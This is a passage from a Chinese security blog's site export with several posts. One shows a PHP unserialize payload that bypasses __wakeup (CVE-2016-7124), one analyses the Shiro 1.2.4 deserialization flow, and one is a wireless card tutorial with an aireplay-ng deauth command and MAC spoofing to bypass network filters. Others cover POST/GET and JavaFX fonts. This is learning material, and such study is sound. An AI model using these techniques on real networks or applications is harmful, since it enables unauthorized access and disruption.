<p>__sleep()<br>　　 serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。<br>　　对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。</p>
<p><br>__wakeup()<br>　　unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。<br>　　预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。</p>
<p> </p>
<p>绕过__wakeup()</p>
<p>CVE-2016-7124漏洞，<strong>当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行</strong>正常序列化对象后是这样的：↓</p>
<p>构造序列化对象：O:5:”SoFun”:1:{S:7:”\00<em>\00file”;s:8:”flag.php”;}<br><br>绕过__wakeup：O:5:”SoFun”:<strong>2</strong>:{S:7:”\00</em>\00file”;s:8:”flag.php”;}</p>
</ul></li>]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>POST和GET的部分知识</title>
    <url>/2020/01/30/POST%E5%92%8CGET%E7%9A%84%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12244175.html">源地址：https://www.cnblogs.com/This-is-Y/p/12244175.html<i class="fas fa-external-link-alt"></i></a></p>
<h3 id="POST和GET的使用场景"><a href="#POST和GET的使用场景" class="headerlink" title="POST和GET的使用场景"></a>POST和GET的使用场景</h3><p>1.请求中包含数据更新等<strong>副作用</strong>时</p>
<p>2.发送敏感信息时(防止Referer等安全隐患)</p>
<p>3.发送的信息量很多时(URL长度有限，但是http协议并未规定get和post的长度限制，长度限制来源与浏览器与web服务器，而不同的浏览器和web服务器，限制的最大长度不一样)</p>
<p>(副作用是指除了获取资源(内容)以外的其他作用,比如追加，更新，删除服务器段数据，购买商品，注册/删除用户等操作，换言之，<strong>更新类的页面必须使用POST方法</strong>)</p>
<p> </p>
<p>当发送的请求有上述其中一条以上时，应该使用POST</p>
<p> </p>
<p>POST和GET方法的优缺点：</p>
<p>　　这里先放一篇写的很不错的博客链接：<a class="link" href="https://blog.csdn.net/qq_28483283/article/details/80207674">https://blog.csdn.net/qq_28483283/article/details/80207674<i class="fas fa-external-link-alt"></i></a></p>
<p>　　以及知乎一篇关于POST和GET的帖子：<a class="link" href="https://zhuanlan.zhihu.com/p/73475134">https://zhuanlan.zhihu.com/p/73475134<i class="fas fa-external-link-alt"></i></a></p>
<p>　　简单总结一下：</p>
<ol>
<li>　　POST更安全（安全只是相对的，对于稍微会一点技术的人来说，拿bp或wireshark就可以看到POST传的数据，甚至还拍好了版。要更加安全还得https）</li>
<li>　　GET更快</li>
<li>　　POST可传递数据更多(GET因为浏览器等对URL的限制，传输数据大小有限)</li>
<li>　　POST能发送更多的数据类型（GET只能发送ASCII字符）</li>
<li>　　POST一般用于写入和修改数据，GET一般用于筛选和排序(如淘宝，支付宝的搜索查询都是get提交)，目的是资源的获取，读取数据</li>
</ol>
<p> </p>
<p>POST为什么比GET慢。</p>
<ul>
<li>先看POST和GET的请求详细过程</li>
</ul>
<p>　　GET：</p>
<p>　　<img src="1503868-20200130215157962-642488494.png" alt></p>
<p> </p>
<p> </p>
<p> 　　POST：</p>
<p>　　<img src="1503868-20200130215228345-1393262275.png" alt></p>
<p> </p>
<p> </p>
<p>可以看到，POST在发送请求头给服务端，且得到服务端的确认后，才会发送请求数据。而GET直接在发送请求头的时候就把数据发送过去了</p>
<ul>
<li>POST因为需要在请求的body部分增加数据，所以会多了几个数据描述部分的首部字段（如：content-type）。但是这个影响比较小，影响速度的原因主要还是第一个。</li>
<li>GET有缓存，POST没有缓存。在Chrome和FireFox下，如果检测到GET数据是静态资源，则会缓存，如果是数据，则不会</li>
<li>针对GET有很多优化方案，然而这些在POST身上却不管用。比如管道通信，关于这个在<a class="link" href="https://blog.csdn.net/qq_28483283/article/details/80207674">https://blog.csdn.net/qq_28483283/article/details/80207674<i class="fas fa-external-link-alt"></i></a>这个帖子里讲得非常详细，想了解可以看这个。</li>
</ul>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>Shiro反序列化分析笔记</title>
    <url>/2023/11/16/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%86%E6%9E%90%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="# 环境搭建"></a># 环境搭建</h1><p>下载 <a class="link" href="https://codeload.github.com/apache/shiro/zip/refs/tags/shiro-root-1.2.4">https://codeload.github.com/apache/shiro/zip/refs/tags/shiro-root-1.2.4<i class="fas fa-external-link-alt"></i></a></p>
<p>java版本为：</p>
<p>idea打开其中的 /shiro-shiro-root-1.2.4/samples/web。pom中如下设置。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="image-20240318153850052.png" alt="image-20240318153850052"></p>
<p>添加一个Tomcat本地服务，设置好不冲突的端口和工件。</p>
<p><img src="image-20240318154015281.png" alt="image-20240318154015281"></p>
<p>点击启动后如果不报错，就会自动打开浏览器。</p>
<p><img src="image-20240318154212422.png" alt="image-20240318154212422"></p>
<h1 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h1><h2 id="加密及登陆过程"><a href="#加密及登陆过程" class="headerlink" title="加密及登陆过程"></a>加密及登陆过程</h2><p>首先可以在/shiro-core/1.2.4/shiro-core-1.2.4-sources.jar!/org/apache/shiro/mgt/AbstractRememberMeManager.java中找到传说的硬编码的aes密钥</p>
<p><img src="image-20240319111143843.png" alt="image-20240319111143843"></p>
<p>一个登陆流程是先从executeLogin() -&gt; subject.login(token) -&gt; securityManager.login(this, token) ,在这个login里面，<code>info = authenticate(token);</code>是负责验证帐号密码是否成功的，</p>
<p><img src="image-20240319114353409.png" alt="image-20240319114353409"></p>
<p>跟进后一路到了<code>doAuthenticate()</code>中，这里通过<code>getRealms()</code>获取到数据源，然后通过<code>doSingleRealmAuthentication()</code>方法，对用户输入的帐号密码进行验证,之后返回info信息。</p>
<p><img src="image-20240319114718342.png"></p>
<p>回到<code>securityManager.login(this, token)</code>中，在获取到info成功后，就会向下走到onSuccessfulLogin(token, info, loggedIn); -&gt; rememberMeSuccessfulLogin(token, info, subject) -&gt; rmm.onSuccessfulLogin(subject, token, info); 然后就到了AbstractRememberMeManager.java中，先使用<code>forgetIdentity(subject);</code>清除之前的Identity，然后创建新Identity（防止之前的认证信息被复用）。</p>
<p><img src="image-20240319163300897.png" alt="image-20240319163300897"></p>
<p>之后进入 rememberIdentity(subject, token, info); -&gt; rememberIdentity(subject, principals); -&gt; convertPrincipalsToBytes(accountPrincipals);在这里面先将身份信息序列化为byte数组，再encrypt()加密，返回。返回后回到rememberIdentity()中，再进入rememberSerializedIdentity(subject, bytes);</p>
<p><img src="image-20240319164055280.png" alt="image-20240319164055280"></p>
<p>在<code>rememberSerializedIdentity()</code>中。把加密的密文base64后，就设置为cookie返回了。</p>
<p><img src="image-20240319171042013.png" alt="image-20240319171042013"></p>
<h2 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h2><p>在上面convertPrincipalsToBytes(accountPrincipals);中，有一个encrypt()，进入AbstractRememberMeManager.java中找到encrypt()，decrypt()就在下面。</p>
<p><img src="image-20240319171911418.png" alt="image-20240319171911418"></p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a class="link" href="https://www.freebuf.com/articles/web/318142.html">https://www.freebuf.com/articles/web/318142.html<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link" href="https://su18.org/post/shiro-1">https://su18.org/post/shiro-1<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
  </entry>
  <entry>
    <title>TP-LINK TL-WN722N无线网卡入门</title>
    <url>/2020/04/05/TP-LINK%20TL-WN722N%E6%97%A0%E7%BA%BF%E7%BD%91%E5%8D%A1%E5%85%A5%E9%97%A8-This-is-Y/</url>
    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12629315.html">源地址：https://www.cnblogs.com/This-is-Y/p/12629315.html<i class="fas fa-external-link-alt"></i></a></p>
<p>某宝上花了我138块大洋买的</p>
<p>（值得注意的是，要买v1版本，v2不支持kali）</p>
<p>信道：<a class="link" href="https://blog.csdn.net/lee_xuwei/article/details/86635864">又被称为通道或频道<i class="fas fa-external-link-alt"></i></a>，是信号在通信系统中传输的通道，由信号从发射端传输到接收端所经过的传输媒质所构成。而无线信道就是以辐射无线电波为传输方式的无线电信道，简单来说就是无线数据传输的通道。</p>
<p>扫描模式：</p>
<p>　　被动扫描：在每个信道上切换以监听AP（无线接入点）周期性发送的Beacon帧，通过解析Beacon帧可以得到该接入点的SSID（热点名称），BSSID（MAC地址），支持的频率等。默认情况下，接入点每100ms发生一次Beacon帧。如果客户端没有在信道上等待足够长的世界，可能会错过AP的Beacon帧。所以这时候就要有主动扫描了</p>
<p>　　主动扫描：在主动扫描中，客户端依然在每个信道中切换，但同时发送Probe Request帧询问该信道上的可用网络，Probe Request帧被发送到广播地址（ff:ff:ff:ff:ff:ff:ff）,一旦发送后就会启动一个计时器并等待响应，计时器结束时处理所有收到的应答。如果没有收到响应，客户端会切换到下一个信道重复发现过程。发送的Probe Requset帧可以指定特定的SSID，称为Directed Probe Requset（定向探测请求），只有具有该SSID的接入点会应答；也可以将SSID的值设为空，称为Broadcast Probe Request（广播探测请求）。收到该请求的所有热点都将进行响应</p>
<p> </p>
<p>监听模式：在监听模式中，内核会直接将802.11帧传递给上层。而不会进行筛选，然后再将802.11帧封装成普通的网络帧传递给上层（非监听模式）。使用在监听模式中，用户可以通过接口直接获得802.11原始数据包。需要注意的是，Linux操作系统下的NetworkManger等网络配置服务可能会改变网卡的工作模式和对信道造成干扰，最好先停止此类服务：airmon-ng check kill</p>
<p> </p>
<p>因为我用的kali虚拟机，建议先等kali开机后，再插入网卡进行识别</p>
<p> </p>
<p>用iwconfig查看网卡状态或修改模式：</p>
<img src="1503868-20200403203319220-1311541029.png" alt>

<p> </p>
<p> </p>
<p>将wlan0无线网卡切换至监听模式，设置信道为11：</p>
<p>i<strong>f</strong>config wlan0 down　　</p>
<p>i<strong>w</strong>config wlan0 mode monitor</p>
<p>i<strong>f</strong>config wlan0 up</p>
<p>i<strong>w</strong>config wlan0 channel 11</p>
<p>出现<img src="1503868-20200403210843386-1237887314.png" alt></p>
<p> </p>
<p> 一般是没有运行ifconfig wlan0 down</p>
<p>要是出现iwconfig: unknown command “down”，擦一下眼睛，检查是不是把ifconfig写成了iwconfig<br><br>设置完后，再iwconfig看看</p>
<img src="1503868-20200403210959168-204663008.png" alt>

<p> </p>
<p> 可以看到模式以及变成了monitor（监听）</p>
<p>Frequency（频率）是2.462GHz，对比可以知道就是11信道</p>
<img src="1503868-20200403211211857-953378904.png" alt>

<p> </p>
<p>除了iwconfig，也可以用iw dev wlan0 info来查看网卡属性</p>
<img src="1503868-20200403211546174-1089635981.png" alt>

<p> </p>
<p> 设置监听模式以及信道</p>
<p>iw dev wlan0 interface add mon0 type monitor（新增mon0虚拟接口并指定为监听模式。删除该接口：iw dev mon0 del）</p>
<p>ifconfig up</p>
<p>iw dev mon0 set channel 11</p>
<p> </p>
<p>除了上面两个，当然还少不了我们的Aircrack-ng了</p>
<p>用它下面的airmon-ng组件新增一个监听端口</p>
<p>airmon-ng start wlan0</p>
<p>用iwconfig查看（这是接口名为wlan0mon）</p>
<img src="1503868-20200403215348773-200607643.png" alt>

<p> </p>
<p> </p>
<p>扫描</p>
<p>airodump-ng：</p>
<p>airodump-ng wlan0mon</p>
<p>可以看到出现的热点信息</p>
<img src="1503868-20200403215640481-1791151241.png" alt>

<p> </p>
<p> 参数值分别为BSSID（MAC地址），PWR（信号强度），Beacon（信标帧数量），Data（数据分组数量），CH（信道），ENC（加密算法），CIPHER（认证协议），ESSID（热点名称）</p>
<p> 下部分为捕获到的无线客户端信息，包裹BSSID，STATION（已连接热点MAC地址），PWR，ProbeRequest帧中的热点名称</p>
<p>然后还可以用Kismet，Wireshark来扫描，这里就不写了（真不是是我懒）</p>
<p> </p>
<p>发现隐藏网络：</p>
<p>使用aireplay-ng –deauth 10 -a &lt;BSSID&gt; mon0（后面再细说）</p>
<p> </p>
<p>关于绕过MAC地址认证</p>
<p>MAC地址认证：通过在路由器设置，从而只允许列表内的客户端连接该网络。然而可以通过修改本机无线网卡的MAC地址来达到绕过。</p>
<p>第一步，使用airodump-ng扫描周边无线网络，可以在下面获取到已连接到热点的正常客户端MAC地址，复制一个保存下来，</p>
<p>第二部，修改本机MAC地址，ifconfig wlan0 down（先停止服务）。ifconfig wlan0 hw ether xx:xx:xx:xx:xx:xx（刚才保存的正常客户端MAC地址）。ifconfig wlan0 up （开始工作）。嫌麻烦可以直接用macchanger -m xx:xx:xx:xx:xx:xx wlan0</p>
<p>值得注意的是，最好等该客户端下线后再尝试绕过连接。否则网络会因为多个客户端有相同的NAC地址而发生网络异常。</p>
<p>修改MAC地址除了可以用来绕过路由器访问限制之外，还可以对某些公共热点对免费使用时间的限制，因为有些免费热点是通过MAC地址来判断客户端新旧的。使用macchanger -r wlan0可以随机设置一个MAC地址（然而在5G即将到来的时候，这种行为显然不是很有必要）</p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p> </p>
<p>　　　　</p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>Ubuntu-Javafx自定义</title>
    <url>/2023/08/15/Ubuntu-Javafx%E8%87%AA%E5%AE%9A%E4%B9%89/</url>
    <content><![CDATA[<h1 id="javafx局部设置字体"><a href="#javafx局部设置字体" class="headerlink" title="javafx局部设置字体"></a>javafx局部设置字体</h1><p>以MysqlMonitor（<a class="link" href="https://github.com/fupinglee/MySQLMonitor%EF%BC%89%E4%B8%BA%E4%BE%8B">https://github.com/fupinglee/MySQLMonitor）为例<i class="fas fa-external-link-alt"></i></a></p>
<p>源代码结构如下：</p>
<p><img src="image-20230913155450349.png" alt="image-20230913155450349"></p>
<p>控件排布是通过加载main.fxml文件来实现的，修改整个的字体需要在main.fxml文件在中修改，这里我使用的加载css的方法修改，</p>
<p>setfont.css</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.custom-font</span> &#123;</span><br><span class="line">    -fx-<span class="attribute">font-family</span>: <span class="string">&#x27;Sarasa Mono SC&#x27;</span>;</span><br><span class="line">    -fx-<span class="attribute">font-size</span>: <span class="number">16px</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>修改后的main.fxml</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;?import javafx.scene.control.Button?&gt;</span><br><span class="line">&lt;?import javafx.scene.control.CheckBox?&gt;</span><br><span class="line">&lt;?import javafx.scene.control.Label?&gt;</span><br><span class="line">&lt;?import javafx.scene.control.TableColumn?&gt;</span><br><span class="line">&lt;?import javafx.scene.control.TableView?&gt;</span><br><span class="line">&lt;?import javafx.scene.control.TextField?&gt;</span><br><span class="line">&lt;?import javafx.scene.layout.AnchorPane?&gt;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">AnchorPane</span> <span class="attr">prefHeight</span>=<span class="string">&quot;600.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;1000.0&quot;</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://javafx.com/javafx/8.0.171&quot;</span> <span class="attr">xmlns:fx</span>=<span class="string">&quot;http://javafx.com/fxml/1&quot;</span> <span class="attr">fx:controller</span>=<span class="string">&quot;com.MainController&quot;</span> <span class="attr">stylesheets</span>=<span class="string">&quot;setfont.css&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">children</span> &gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Label</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;37.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;27.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;Host:&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextField</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span>  <span class="attr">fx:id</span>=<span class="string">&quot;textField_host&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;93.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;22.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;178.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;127.0.0.1&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Label</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span>  <span class="attr">layoutX</span>=<span class="string">&quot;284.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;27.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;Port:&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextField</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span>  <span class="attr">fx:id</span>=<span class="string">&quot;textField_port&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;323.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;22.0&quot;</span> <span class="attr">prefHeight</span>=<span class="string">&quot;27.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;113.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;3306&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Label</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span>  <span class="attr">layoutX</span>=<span class="string">&quot;452.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;27.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;User:&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextField</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span>  <span class="attr">fx:id</span>=<span class="string">&quot;textField_user&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;495.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;23.0&quot;</span> <span class="attr">prefHeight</span>=<span class="string">&quot;27.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;136.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;root&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Label</span>  <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;642.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;27.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;Pass:&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">CheckBox</span> <span class="attr">fx:id</span>=<span class="string">&quot;cb_showPass&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;846.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;27.0&quot;</span> <span class="attr">mnemonicParsing</span>=<span class="string">&quot;false&quot;</span> <span class="attr">text</span>=<span class="string">&quot;显示&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextField</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;textField_password&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;680.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;22.0&quot;</span> <span class="attr">prefHeight</span>=<span class="string">&quot;27.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;157.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;root&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Button</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;testConn&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;39.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;66.0&quot;</span> <span class="attr">mnemonicParsing</span>=<span class="string">&quot;false&quot;</span> <span class="attr">text</span>=<span class="string">&quot;数据库连接&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Button</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;btn_logOn&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;152.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;66.0&quot;</span> <span class="attr">mnemonicParsing</span>=<span class="string">&quot;false&quot;</span> <span class="attr">text</span>=<span class="string">&quot;下断&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Button</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;btn_update&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;244.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;66.0&quot;</span> <span class="attr">mnemonicParsing</span>=<span class="string">&quot;false&quot;</span> <span class="attr">text</span>=<span class="string">&quot;更新&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">      <span class="tag">&lt;<span class="name">Button</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;btn_clear&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;329.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;66.0&quot;</span> <span class="attr">mnemonicParsing</span>=<span class="string">&quot;false&quot;</span> <span class="attr">text</span>=<span class="string">&quot;清空&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Label</span>  <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;452.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;71.0&quot;</span> <span class="attr">prefHeight</span>=<span class="string">&quot;17.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;50.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;搜索：&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TextField</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;textField_filter&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;495.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;66.0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">TableView</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;tableView&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;25.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;109.0&quot;</span> <span class="attr">prefHeight</span>=<span class="string">&quot;433.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;955.0&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">columns</span>&gt;</span></span><br><span class="line">           <span class="tag">&lt;<span class="name">TableColumn</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;tableCol_id&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;65.0&quot;</span> <span class="attr">resizable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">text</span>=<span class="string">&quot;ID&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">TableColumn</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;tableCol_date&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;160.0&quot;</span> <span class="attr">resizable</span>=<span class="string">&quot;false&quot;</span> <span class="attr">text</span>=<span class="string">&quot;Date&quot;</span> /&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">TableColumn</span> <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;tableCol_sql&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;730.0&quot;</span> <span class="attr">text</span>=<span class="string">&quot;SQL&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">columns</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">TableView</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Label</span>  <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;label_date&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;37.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;560.0&quot;</span> <span class="attr">prefHeight</span>=<span class="string">&quot;17.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;300.0&quot;</span> /&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">Label</span>  <span class="attr">styleClass</span>=<span class="string">&quot;custom-font&quot;</span> <span class="attr">fx:id</span>=<span class="string">&quot;label_state&quot;</span> <span class="attr">layoutX</span>=<span class="string">&quot;650.0&quot;</span> <span class="attr">layoutY</span>=<span class="string">&quot;560.0&quot;</span> <span class="attr">prefHeight</span>=<span class="string">&quot;17.0&quot;</span> <span class="attr">prefWidth</span>=<span class="string">&quot;300.0&quot;</span> /&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">children</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">AnchorPane</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>主要是批量添加了 styleClass=”custom-font” 和 stylesheets=”setfont.css” </p>
<p>修改后的根据界面：</p>
<p><img src="image-20230913160611893.png" alt="image-20230913160611893"></p>
<p>对比一下之前的：</p>
<p><img src="image-20230913160745460.png" alt="image-20230913160745460"></p>
<h1 id="javafx全局设置字体"><a href="#javafx全局设置字体" class="headerlink" title="javafx全局设置字体"></a>javafx全局设置字体</h1><p>直接上代码吧</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> Util.Utils;</span><br><span class="line"><span class="keyword">import</span> javafx.application.Application;</span><br><span class="line"><span class="keyword">import</span> javafx.fxml.FXMLLoader;</span><br><span class="line"><span class="keyword">import</span> javafx.scene.Parent;</span><br><span class="line"><span class="keyword">import</span> javafx.scene.Scene;</span><br><span class="line"><span class="keyword">import</span> javafx.scene.image.Image;</span><br><span class="line"><span class="keyword">import</span> javafx.scene.text.Font;</span><br><span class="line"><span class="keyword">import</span> javafx.stage.Stage;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Objects;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">main</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">start</span><span class="params">(Stage primaryStage)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        Parent root = FXMLLoader.load(getClass().getResource(<span class="string">&quot;/main.fxml&quot;</span>));</span><br><span class="line">        primaryStage.getIcons().add(<span class="keyword">new</span> Image(getClass().getResourceAsStream(<span class="string">&quot;/images/logo.png&quot;</span>)));</span><br><span class="line">        primaryStage.setTitle(<span class="string">&quot;Multiple Database Utilization Tools - &quot;</span> + 